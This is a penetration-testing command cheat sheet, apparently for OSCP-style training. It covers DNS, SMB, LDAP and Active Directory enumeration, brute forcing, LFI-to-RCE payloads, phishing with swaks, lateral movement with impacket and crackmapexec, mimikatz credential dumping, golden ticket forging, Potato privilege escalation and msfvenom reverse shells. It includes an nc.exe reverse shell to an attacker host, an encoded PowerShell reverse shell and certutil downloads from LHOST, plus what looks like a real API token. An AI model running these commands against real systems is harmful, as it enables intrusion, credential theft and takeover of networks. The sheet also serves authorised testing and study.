## FIRST INSTALL PSE TOOL FROM:
```
https://github.com/ssstonebraker/Pentest-Service-Enumeration.git
```
THIS HELPS IN VIEWING CHEAT SHEET IN TERMINAL.

---
## NOW, MAKE CUSTOM FILES FOR EACH OF THE FOLLOWING TOPICS:

---

## Enumeration (DNS)

dnsenum
Bruteforce DNS:dnsenum megacorpone.com
dnsrecon
Standard DNS recon:dnsrecon -d megacorpone.com -t std
Bruteforce DNS with wordlist:dnsrecon -d megacorpone.com -D \~/list.txt -t brt
host
Basic DNS lookup:host [www.megacorpone.com](https://www.megacorpone.com)
MX record lookup:host -t mx megacorpone.com
TXT record lookup:host -t txt megacorpone.com
DNS bruteforce (bash loop):for ip in $(cat list.txt); do host $ip.megacorpone.com; done
Reverse DNS bruteforce (bash loop):for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
nslookup
Basic DNS lookup:nslookup mail.megacorptwo.com
Query specific nameserver:nslookup -type=TXT info.megacorptwo.com 192.168.50.151
whois
Basic whois lookup:whois \<domain\>
Whois lookup on specific server:whois \<domain\> -h \<IP\>

-----

## Enumeration (Web)

gobuster
Enumerate directories:gobuster dir -u [http://example.com](http://example.com) -w /path/to/wordlist.txt
Identify API endpoints:gobuster dir -u [http://192.168.50.16:5002](http://192.168.50.16:5002) -w /usr/share/wordlists/dirb/big.txt -p pattern

-----

## Enumeration (Network & Service)

impacket-services
Enumerate services:services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action]
nbtscan
Scan subnet for NetBIOS:sudo nbtscan -r 192.168.50.0/24
net view
View shares on Windows:net view \<computername/IP\> /all
nmap
Basic scan (scripts, versions):nmap -sC -sV \<IP\> -v
Complete scan (all ports, aggressive):nmap -T4 -A -p- \<IP\> -v
Run 'vuln' scripts on port 443:sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
Run specific NSE script:sudo nmap --script="name" \<IP\>
Enumerate SMB with NSE script:nmap -p445 --script="name" $IP
Enumerate NFS shares:nmap -sV --script=nfs-showmount \<IP\>
Full UDP scan (aggressive):sudo nmap \<IP\> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
Scan for winrm ports:nmap -p5985,5986 \<IP\>
psloggedon
See remote user logons:.\\PsLoggedon.exe \<computername\>
rpcclient
Connect to RPC (user):rpcclient -U=user $IP
Connect to RPC (anonymous):rpcclient -U="" $IP
Show server info (rpcclient):srvinfo
Enumerate domain users (rpcclient):enumdomusers
Enumerate privileges (rpcclient):enumpriv
Query user details (rpcclient):queryuser \<user\>
Get password policy (rpcclient):getuserdompwinfo \<RID\>
Lookup user SID (rpcclient):lookupnames \<user\>
Create domain user (rpcclient):createdomuser \<username\>
Delete domain user (rpcclient):deletedomuser \<username\>
Enumerate domains (rpcclient):enumdomains
Enumerate domain groups (rpcclient):enumdomgroups
Query group details (rpcclient):querygroup \<group-RID\>
Query user descriptions (rpcclient):querydispinfo
Enumerate shares (rpcclient):netshareenum
Enumerate all shares (rpcclient):netshareenumall
Enumerate all SIDs (rpcclient):lsaenumsid
showmount
Enumerate NFS shares from attacker:showmount -e \<IP\>
View mountable shares (on target):cat /etc/exports
smbmap
Enumerate SMB (host):smbmap -H \<target\_ip\>
Enumerate SMB (credentials):smbmap -H \<target\_ip\> -u \<username\> -p \<password\>
Enumerate SMB (domain):smbmap -H \<target\_ip\> -u \<username\> -p \<password\> -d \<domain\>
Enumerate SMB (share):smbmap -H \<target\_ip\> -u \<username\> -p \<password\> -r \<share\_name\>
smtp-user-enum
Enumerate SMTP users (VRFY):smtp-user-enum -M VRFY -U username.txt -t \<IP\>
snmpcheck
Enumerate SNMP (public):snmpcheck -t \<IP\> -c public
snmpwalk
Dump entire MIB tree:snmpwalk -c public -v1 -t 10 \<IP\>
Enumerate Windows users (SNMP):snmpwalk -c public -v1 \<IP\> 1.3.6.1.4.1.77.1.2.25
Enumerate Windows processes (SNMP):snmpwalk -c public -v1 \<IP\> 1.3.6.1.2.1.25.4.2.1.2
Enumerate installed software (SNMP):snmpwalk -c public -v1 \<IP\> 1.3.6.1.2.1.25.6.3.1.2
Enumerate open TCP ports (SNMP):snmpwalk -c public -v1 \<IP\> 1.3.6.1.2.1.6.13.1.3

-----

## Enumeration (Active Directory)

bloodhound-python
Run BloodHound-Python collector:bloodhound-python -u 'uname' -p 'pass' -ns \<rhost\> -d \<domain-name\> -c all
impacket-lookupsid
Enumerate users on target:lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address]
ldapdomaindump
Dump LDAP domain info:sudo ldapdomaindump ldaps://\<IP\> -u 'username' -p 'password'
ldapsearch
Anonymous LDAP search (root):ldapsearch -x -H ldap://\<IP\>:\<port\>
Anonymous LDAP search (domain):ldapsearch -x -H ldap://\<IP\> -D '' -w '' -b "DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (domain):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Users):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Users,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Computers):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Computers,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Domain Admins):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Domain Admins,CN=Users,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Domain Users):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Domain Users,CN=Users,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Enterprise Admins):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Enterprise Admins,CN=Users,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Administrators):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Administrators,CN=Builtin,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
Authenticated LDAP search (Remote Desktop Users):ldapsearch -x -H ldap://\<IP\> -D '\<DOMAIN\>\<username\>' -w '\<password\>' -b "CN=Remote Desktop Users,CN=Builtin,DC=\<1\_SUBDOMAIN\>,DC=\<TLD\>"
plumhound
Test PlumHound connection:sudo python3 plumhound.py --easy -p \<neo4j-password\>
Run PlumHound default tasks:python3 PlumHound.py -x tasks/default.tasks -p \<neo4jpass\>
windapsearch
Find computers (windapsearch):python3 windapsearch.py --dc-ip \<IP address\> -u \<username\> -p \<password\> --computers
Find groups (windapsearch):python3 windapsearch.py --dc-ip \<IP address\> -u \<username\> -p \<password\> --groups
Find users (windapsearch):python3 windapsearch.py --dc-ip \<IP address\> -u \<username\> -p \<password\> --da
Find privileged users (windapsearch):python3 windapsearch.py --dc-ip \<IP address\> -u \<username\> -p \<password\> --privileged-users

-----

## Vulnerability Scanning

droopescan
Scan Drupal site:droopescan scan drupal -u http://site
Scan Joomla site:droopescan scan joomla --url http://site
nikto
Scan website for vulnerabilities:nikto -h \<url\>
searchsploit
Search exploits:searchsploit \<name\>
Copy exploit to current directory:searchsploit -m windows/remote/46697.py
wpscan
Basic WPScan:wpscan --url "target" --verbose
Enumerate plugins, users, themes (WPScan):wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
WPScan with API token:wpscan --url [http://alvida-eatery.org/](http://alvida-eatery.org/) --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA

-----

## Exploitation (Bruteforce)

hydra
Bruteforce FTP:hydra -L users.txt -P passwords.txt \<IP\> ftp
Bruteforce SSH:hydra -l uname -P passwords.txt \<IP\> ssh
Bruteforce HTTP form (POST/GET):hydra -L users.txt -P password.txt \<IP or domain\> http-{post/get}-form "/path:name=^USER^\&password=^PASS^\&enter=Sign+in:Login name or password is incorrect" -V
joomla-brute
Bruteforce Joomla login:sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username
kerbrute
Password spray with Kerbrute:kerbrute passwordspray -d corp.com .\\usernames.txt "pass"

-----

## Exploitation (Web)

curl
Download file on Linux:curl http://\<LHOST\>/\<FILE\> \> \<OUTPUT\_FILE\>
Obtain API info:curl -i [http://192.168.50.16:5002/users/v1](http://192.168.50.16:5002/users/v1)
Exploit directory traversal (encoded):curl [suspicious link removed]
Exploit LFI with PHP wrapper (RCE):curl "[http://mountaindesserts.com/meteor/index.php?page=data://text/plain](http://mountaindesserts.com/meteor/index.php?page=data://text/plain),\<?php%20echo%20system('uname%20-a');?\>"
Exploit LFI with PHP filter (read source):curl [http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php](http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php)
sqlmap
Test parameter 'user' for SQLi:sqlmap -u [http://192.168.50.19/blindsqli.php?user=1](http://192.168.50.19/blindsqli.php?user=1) -p user
Dump database:sqlmap -u [http://192.168.50.19/blindsqli.php?user=1](http://192.168.50.19/blindsqli.php?user=1) -p user --dump
Get OS shell (from POST request):sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

-----

## Exploitation (Phishing)

swaks
Send email (phishing example):sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

-----

## Exploitation / Payload Execution

msiexec
Silently execute MSI:msiexec /quiet /qn /i reverse.msi

-----

## Lateral Movement & Remote Execution

atexec
Execute command with atexec (credentials):atexec.py test.local/john:password123@10.10.10.1 \<command\>
Execute command with atexec (hash):atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 \<command\>
crackmapexec
Basic SMB enumeration:crackmapexec smb \<IP/range\>
Enumerate SMB with credentials:crackmapexec smb 192.168.1.100 -u username -p password
List SMB shares with credentials:crackmapexec smb 192.168.1.100 -u username -p password --shares
List SMB users with credentials:crackmapexec smb 192.168.1.100 -u username -p password --users
Enumerate all SMB info with credentials:crackmapexec smb 192.168.1.100 -u username -p password --all
List SMB shares on specific port:crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares
List SMB shares in specific domain:crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares
Enumerate supported services:crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}
Bruteforce attack (shows 'Pwned'):crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt --continue-on-success
Bruteforce attack (grep 'Pwned'):crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt --continue-on-success | grep '[+]'
Password spraying:crackmapexec smb \<Rhost/range\> -u user.txt -p 'password' --continue-on-success
List shares with credentials:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --shares
List disks with credentials:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --disks
Enumerate users (requires DC IP):crackmapexec smb \<DC-IP\> -u 'user' -p 'password' --users
List active logon sessions:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --sessions
Dump password policy:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --pass-pol
Dump SAM hashes:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --sam
Dump LSA secrets:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --lsa
Dump NTDS.dit file:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --ntds
Enumerate specific group members:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --groups {groupname}
Execute CMD command:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' -x 'command'
Execute command with Pass-the-Hash (local auth):crackmapexec smb \<ip or range\> -u username -H \<full hash\> --local-auth
List crackmapexec modules:crackmapexec smb -L
Show module options (e.g., mimikatz):crackmapexec smb -M mimikatx --options
Run mimikatz module (default):crackmapexec smb \<Rhost\> -u 'user' -p 'password' -M mimikatz
Run specific mimikatz command:crackmapexec smb \<Rhost\> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug'
Enumerate GPP passwords:crackmapexec smb \<TARGET[s]\> -u \<USERNAME\> -p \<PASSWORD\> -d \<DOMAIN\> -M gpp\_password
Enumerate GPP passwords (PTH):crackmapexec smb \<TARGET[s]\> -u \<USERNAME\> -H LMHash:NTLMHash -d \<DOMAIN\> -M gpp\_password
Password spray (continue on success):crackmapexec smb \<IP or subnet\> -u users.txt -p 'pass' -d \<domain\> --continue-on-success
cmedb
Launch crackmapexec database console:cmedb
View help in cmedb console:help
dcom
Execute DCOM command (calc):$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
Execute DCOM command (powershell reverse shell):$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
evil-winrm
Login with password (plaintext):evil-winrm -i \<IP\> -u user -p pass
Login with password (SSL):evil-winrm -i \<IP\> -u user -p pass -S
Login with NTLM hash:evil-winrm -i \<IP\> -u user -H ntlmhash
Login with certificate key:evil-winrm -i \<IP\> -c certificate.pem -k priv-key.pem -S
Login and save logs:evil-winrm -i \<IP\> -u user -p pass -l
Upload file in session:upload \<file\>
Download file in session:download \<file\> \<filepath-kali\>
Load scripts from local directory:evil-winrm -i \<IP\> -u user -p pass -s /opt/privsc/powershell
View evil-winrm commands:menu
Execute binary from local share:Invoke-Binary /opt/privsc/winPEASx64.exe
impacket-mssqlclient
Log in to MSSQL:impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Show advanced options (MSSQL):EXECUTE sp\_configure 'show advanced options', 1;
Reconfigure (MSSQL):RECONFIGURE;
Enable xp\_cmdshell (MSSQL):EXECUTE sp\_configure 'xp\_cmdshell', 1;
Execute command (MSSQL):EXECUTE xp\_cmdshell 'whoami';
impacket-smbexec
Execute command with smbexec (credentials):smbexec.py test.local/john:password123@10.10.10.1
Execute command with smbexec (hash):smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
Lateral movement (credentials):smbexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
Lateral movement (hash):smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
impacket-wmiexec
Execute command with wmiexec (credentials):wmiexec.py test.local/john:password123@10.10.10.1
Execute command with wmiexec (hash):wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
Lateral movement (credentials):wmiexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
Lateral movement (hash):wmiexec.py -hashes aad3b435b51404eeaad3Fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
psexec
Execute command with psexec (credentials):psexec.py test.local/john:password123@10.10.10.1
Execute command with psexec (hash):psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
Lateral movement (credentials):psexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
Lateral movement (hash):psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
pth-winexe
Pass the Hash with pth-winexe:pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
ssh
Login with password:ssh uname@IP
Login with key:ssh uname@IP -i id\_rsa/id\_ecdsa
SSH dynamic port forward (SOCKS proxy):ssh adminuser@10.10.155.5 -i id\_rsa -D 9050
Login with public key:ssh username@target\_ip
winrs
Execute remote command with winrs:winrs -r:\<computername\> -u:\<user\> -p:\<password\> "command"
xfreerdp
Connect to RDP (user/pass):xfreerdp /u:uname /p:'pass' /v:IP
Connect to RDP (domain/user/pass):xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
Connect to RDP (clipboard):xfreerdp /u:uname /p:'pass' /v:IP +clipboard

-----

## Credential Access & Cracking

cmdkey
List stored Windows credentials:cmdkey /list
fcrackzip
Crack zip file password:fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt \<FILE\>.zip
gpp-decrypt
Decrypt GPP cpassword:gpp-decrypt "cpassword"
hashcat
Crack hash with Hashcat:hashcat -m \<number\> hash wordlists.txt --force
Crack AS-REP roast hash (18200):hashcat -m 18200 hashes.txt wordlist.txt --force
Crack Kerberoast hash (13100):hashcat -m 13100 hashes.txt wordlist.txt --force
impacket-Get-GPPPassword
Get GPP password (null session):Get-GPPPassword.py -no-pass 'DOMAIN\_CONTROLLER'
Get GPP password (credentials):Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN\_CONTROLLER'
Get GPP password (PTH):Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN\_CONTROLLER'
Parse GPP password from local XML:Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
john
Crack hash with John:john hashfile --wordlist=rockyou.txt
Crack SSH key hash:john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
Crack Keepass KDBX hash:john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
keepass2john
Convert KDBX file to John hash:keepass2john Database.kdbx \> keepasshash
ssh-keygen
Generate RSA key pair:ssh-keygen -t rsa -b 4096
ssh2john
Convert SSH key to John hash:ssh2john.py id\_rsa \> hash
Crack SSH key hash (john):ssh2john id\_ecdsa(or)id\_rsa \> hash
vshadow
Create persistent shadow copy:vshadow.exe -nw -p C:
Copy ntds.dit from shadow copy:copy ?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak

-----

## Credential Access (Active Directory)

impacket-GetNPUsers
Request AS-REP roast hash:impacket-GetNPUsers -dc-ip \<DC-IP\> \<domain\>/\<user\>:\<pass\> -request
impacket-GetUserSPNs
Request Kerberoast TGS hash:impacket-GetUserSPNs -dc-ip \<DC-IP\> \<domain\>/\<user\>:\<pass\> -request
Request Kerberoast TGS hash (full):GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip \<IP\> -request
impacket-secretsdump
Dump hashes on target:secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]
Dump hashes from SYSTEM and SAM:impacket-secretsdump -system SYSTEM -sam SAM local
Dump hashes with credentials:secretsdump.py \<domain\>/\<user\>:\<password\>@\<IP\>
Dump hashes (local user PTH):secretsdump.py uname@IP -hashes lmhash:ntlmhash
Dump hashes (domain user PTH):secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash
Dump NTDS.dit (with credentials):secretsdump.py \<domain\>/\<user\>:\<password\>@\<IP\> -just-dc-ntlm
Dump hashes from ntds.dit backup:impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
kerberos
Purge existing Kerberos tickets:kerberos::purge
Save forged ticket to session:kerberos::ptt golden
Access cmd via ticket:misc::cmd
Pass the ticket (Mimikatz):kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-\<RHOST\>.LOCAL.kirbi
klist
Check Kerberos tickets:klist
mimikatz
Enable debug privilege:privilege::debug
Elevate token:token::elevate
Dump logon passwords and hashes:sekurlsa::logonpasswords
Dump SAM:lsadump::sam
Dump SAM from backup:lsadump::sam SystemBkup.hiv SamBkup.hiv
DCSync krbtgt:lsadump::dcsync /user:krbtgt
Dump LSA (patched):lsadump::lsa /patch
One-liner (debug, logonpasswords, exit):.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
Export tickets:sekurlsa::tickets /export
Inject LSA to get krbtgt:lsadump::lsa /inject /name:krbtgt
Patch LSA to get krbtgt:lsadump::lsa /patch
Forge golden ticket:kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden
Start mimikatz (no privs):mimikatz.exe
Rubeus
AS-REP roast from Windows host:.\\Rubeus.exe asreproast /nowrap
Kerberoast from Windows host:.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast

-----

## Privilege Escalation (Windows)

accesschk
Check writable permissions for user:accesschk.exe \\accepteula -wvu "\<path\>"
Check registry key permissions:accesschk /acceptula -uvwqk \<path of registry\>
GodPotato
Execute command with GodPotato:GodPotato.exe -cmd "cmd /c whoami"
Execute reverse shell with GodPotato:GodPotato.exe -cmd "shell.exe"
icalcs
Check folder permissions:icalcs "path"
JuicyPotatoNG
Execute command with JuicyPotatoNG:JuicyPotatoNG.exe -t \* -p "shell.exe" -a
PrintSpoofer
Impersonate system (powershell):PrintSpoofer.exe -i -c powershell.exe
Impersonate system (reverse shell):PrintSpoofer.exe -c "nc.exe \<lhost\> \<lport\> -e cmd"
reg
Query registry for AlwaysInstallElevated (HKCU):reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
Query registry for AlwaysInstallElevated (HKLM):reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
Query autorun programs (HKCU):reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Query autorun programs (HKLM):reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Query registry for service executable path:reg query \<reg-path\>
Modify service ImagePath in registry:reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG\_EXPAND\_SZ /d C:\\PrivEsc\\reverse.exe /f
Search HKLM for 'password':reg query HKLM /f password /t REG\_SZ /s
Query winlogon credentials:reg query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"
Query Putty sessions:reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
Query Putty session details:reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s | findstr "HKEY\_CURRENT\_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
Query VNC password:reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
Query TightVNC settings:reg query "HKCU\\Software\\TightVNC\\Server"
Query Windows autologin credentials:reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"
Find Windows autologin credentials:reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2\>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Query SNMP parameters:reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"
Search HKCU for 'password':reg query HKCU /f password /t REG\_SZ /s
Save SYSTEM hive backup:reg.exe save hklm\\system c:\\system.bak
RoguePotato
Execute command with RoguePotato:RoguePotato.exe -r \<AttackerIP\> -e "shell.exe" -l 9999
runas
Execute command as user with saved credentials:runas /savecred /user:admin C:\\Temp\\reverse.exe
sc
Query service binary path:sc qc \<servicename\>
Modify service binary path:sc config \<service\> \<option\>="\<value\>"
Start service:sc start \<servicename\>
schtasks
Query scheduled tasks (list format):schtasks /query /fo LIST /v
SharpEfsPotato
Execute command with SharpEfsPotato (write output):SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a "whoami | Set-Content C:\\temp\\w.log"
wmic
Find unquoted service paths:wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v """

-----

## Privilege Escalation (Linux)

crontab
List cron jobs for current user:crontab -l
getcap
Find files with capabilities:getcap -r / 2\>/dev/null
sudo
Check sudo permissions:sudo -l

-----

## Post-Exploitation (File Search)

dir
Find KDBX files (Windows cmd):dir /s /b \*.kdbx
Search for passwords in files (cmd):findstr /si password \*.xml \*.ini \*.txt
Find files containing "pass" (cmd):dir /s pass == cred == vnc == .config
Find string "password" in all files (cmd):findstr /spin "password" .
Find unattend.xml files (cmd):dir /b /s unattend.xml
Find web.config files (cmd):dir /b /s web.config
Find sysprep.inf files (cmd):dir /b /s sysprep.inf
Find sysprep.xml files (cmd):dir /b /s sysprep.xml
Find files with "pass" in name (cmd):dir /b /s pass
Find vnc.ini files (cmd):dir c:\*vnc.ini /s /b
Find ultravnc.ini files (cmd):dir c:\*ultravnc.ini /s /b
Find vnc.ini files (alternative):dir c:\\ /s /b | findstr /si \*vnc.ini
Find SAM file (cmd):dir /s SAM
Find SYSTEM file (cmd):dir /s SYSTEM
find
Find KDBX files in Linux:find / -name \*.kdbx 2\>/dev/null
Find writable directories:find / -writable -type d 2\>/dev/null
Find SUID files:find / -perm -u=s -type f 2\>/dev/null
grep
Inspect cron logs:grep "CRON" /var/log/syslog
Find cpassword in SYSVOL share:grep -inr "cpassword"

-----

## Post-Exploitation (System Info)

dpkg
List installed applications (Debian):dpkg -l
env
Check environment variables:env
git
Log current repository information:git log
Show commit information and new additions:git show \<commit-id\>
lsblk
List all available drives:lsblk
lsmod
List loaded drivers:lsmod
watch
Watch processes for credentials:watch -n 1 "ps -aux | grep pass"
Watch processes for credentials (alternative):watch -n 1 "ps -aux | grep pass"

-----

## Post-Exploitation (Network)

tcpdump
Sniff loopback for 'pass':sudo tcpdump -i lo -A | grep "pass"

-----

## Post-Exploitation (PowerShell)

powershell
Find KDBX files in Windows:Get-ChildItem -Path C:\\ -Include .kdbx -File -Recurse -ErrorAction SilentlyContinue
Download file (Invoke-WebRequest):powershell -command Invoke-WebRequest -Uri http://\<LHOST\>:\<LPORT\>/\<FILE\> -Outfile C:\\temp\<FILE\>
Download file (iwr alias):iwr -uri http://lhost/file -Outfile file
Download file (certutil):certutil -urlcache -split -f "http://\<LHOST\>/\<FILE\>" \<FILE\>
Test network connection to port:Test-NetConnection -Port \<port\> \<IP\>
Scan first 1024 ports:1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $*)) "TCP port $_ is open"} 2>$null
View current user's groups:whoami /groups
View all privileges and info:whoami /all
Start a service:Start-Service \<service\>
Stop a service:Stop-Service \<service\>
Restart a service:Restart-Service \<service\>
View command history:Get-History
View history save path:(Get-PSReadlineOption).HistorySavePath
View history file content:type C:\\Users\\sathvik\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt
View installed executables (32-bit):Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\*" | select displayname
View installed executables (64-bit):Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\*" | select displayname
List running processes:Get-Process
List running processes with path:Get-Process | Select ProcessName,Path
Find sensitive files in XAMPP:Get-ChildItem -Path C:\\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue
Find sensitive files for user:Get-ChildItem -Path C:\\Users\\dave\\ -Include .txt,.pdf,.xls,.xlsx,.doc,\*.docx -File -Recurse -ErrorAction SilentlyContinue
List running services:Get-CimInstance -ClassName win32\_service | Select Name,State,PathName | Where-Object {$*.State -like 'Running'}
Find KDBX files (PowerShell):Get-ChildItem -Recurse -Filter \*.kdbx
View PowerShell history file:type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt
Load PowerView module:Import-Module .\\PowerView.ps1
Get basic domain info (PowerView):Get-NetDomain
List all domain users (PowerView):Get-NetUser
Enumerate domain groups (PowerView):Get-NetGroup
Get info for specific group (PowerView):Get-NetGroup "group name"
Enumerate domain computers (PowerView):Get-NetComputer
Find local admin access (PowerView):Find-LocalAdminAccess
Check logged on users (PowerView):Get-NetSession -ComputerName files04 -Verbose
List SPN accounts (PowerView):Get-NetUser -SPN | select samaccountname,serviceprincipalname
Enumerate object ACLs (PowerView):Get-ObjectAcl -Identity \_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Find domain shares (PowerView):Find-DomainShare
Find AS-REP roastable accounts (PowerView):Get-DomainUser -PreauthNotRequired -verbose
Find Kerberoastable accounts (PowerView):Get-NetUser -SPN | select serviceprincipalname
Load SharpHound module:Import-Module .\\Sharphound.ps1
Invoke BloodHound collector:Invoke-BloodHound -CollectionMethod All -OutputDirectory \<location\> -OutputPrefix "name"
Check user SID:whoami /user
Check Kerberos tickets:klist
Access service with default credentials:iwr -UseDefaultCredentials \<servicename\>://\<computername\>

-----

## Shells & Payloads

msfvenom
Generate windows/shell/reverse\_tcp (x86 exe):msfvenom -p windows/shell/reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f exe \> shell-x86.exe
Generate windows/x64/shell\_reverse\_tcp (x64 exe):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f exe \> shell-x64.exe
Generate windows/shell/reverse\_tcp (asp):msfvenom -p windows/shell/reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f asp \> shell.asp
Generate java/jsp\_shell\_reverse\_tcp (jsp):msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f raw \> shell.jsp
